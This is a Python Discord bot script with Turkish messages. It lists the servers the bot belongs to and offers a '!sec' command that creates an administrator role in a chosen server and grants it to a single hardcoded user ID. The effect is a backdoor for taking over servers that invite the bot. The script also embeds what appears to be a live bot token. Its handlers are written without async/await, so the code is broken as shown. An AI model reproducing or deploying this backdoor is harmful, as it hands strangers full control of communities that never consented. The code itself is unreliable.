import discord
from discord.ext import commands

TOKEN = 'MTMzMDQ5OTUwMDUyMjg2ODczNg.G_ks9h.0nPg5x9q4v4vzsrWe-9LKz1yUJAJhUGjeT-5JQ'

USER_ID = 635103657934716929 

ROLE_NAME = "olabilir hersey"

intents = discord.Intents.default()
intents.members = True  

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
def on_ready():
    print(f'Giriş yapıldı olarak: {bot.user}')

@bot.command()
def sunucular(ctx):

    guilds = bot.guilds
    if not guilds:
        ctx.send("Bot, herhangi bir sunucuya bağlı değil.")
        return

    guild_list = [f"{guild.name} (ID: {guild.id})" for guild in guilds]
    guild_list_str = "\n".join(guild_list)
    ctx.send(f"Bağlı olduğum sunucular:\n{guild_list_str}\n\nSunucu ID'si ile seçim yapabilirsiniz.")

@bot.command()
def sec(ctx, guild_id):

    guild = bot.get_guild(int(guild_id))

    if guild is None:
        ctx.send("Geçersiz sunucu ID'si.")
        return

    role = guild.create_role(name=ROLE_NAME, permissions=discord.Permissions(administrator=True))
    ctx.send(f"{guild.name} sunucusunda '{ROLE_NAME}' rolü oluşturuldu.")

    member = guild.get_member(USER_ID)
    if member is None:
        ctx.send("Belirtilen kullanıcı bulunamadı.")
        return

    member.add_roles(role)
    ctx.send(f"{member.name} kullanıcısına '{ROLE_NAME}' rolü verildi.")

bot.run(TOKEN)
